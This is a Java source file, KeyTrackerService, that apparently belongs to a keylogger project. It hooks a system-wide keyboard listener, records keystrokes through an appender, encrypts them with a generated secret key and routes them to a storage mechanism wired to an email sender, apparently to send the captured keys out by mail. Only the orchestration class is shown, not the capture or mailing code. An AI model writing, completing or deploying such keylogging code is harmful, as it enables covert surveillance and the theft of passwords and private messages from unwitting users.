package com.keytracker;

import com.keytracker.encrypt.KeyGen;
import com.keytracker.handlers.HandlersProvider;
import com.keytracker.mail.MailSender;
import de.ksquared.system.keyboard.KeyListener;

public class KeyTrackerService {
    private final KeyListener keyListener;
    private final StoreMechanism storeMechanism;

    public KeyTrackerService(String[] args) {
        ArgsResolver argsResolver = new ArgsResolver(args);
        MailSender mailSender = new MailSender();
        SecretKeyStore store = new SecretKeyStore(new KeyGen(), mailSender, argsResolver);

        KeyAppender keyAppender = new KeyAppender();
        MechanismsFactory mechanismsFactory = new MechanismsFactoryImpl(argsResolver, mailSender, store.secretKey());
        this.storeMechanism = mechanismsFactory.getStoreMechanism();
        this.storeMechanism.registerAppender(keyAppender);

        this.keyListener = new KeyListenerImpl(new AsciToStringKeyResolver(new HandlersProvider(new CharactersProvider())), keyAppender);
    }

    public KeyListener getKeyListener() {
        return this.keyListener;
    }

    public StoreMechanism getStoreMechanism() {
        return this.storeMechanism;
    }
}
